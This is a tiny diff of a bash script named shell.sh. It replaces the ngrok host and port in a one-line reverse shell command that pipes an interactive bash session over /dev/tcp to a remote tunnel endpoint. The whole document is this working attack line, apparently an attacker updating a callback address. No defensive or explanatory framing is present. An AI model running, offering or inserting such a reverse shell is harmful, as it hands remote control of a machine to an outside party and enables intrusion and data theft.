@@ -1,4 +1,4 @@
 #!/bin/bash
 #shell.sh
 
-bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18585 0>&1
+bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12771 0>&1
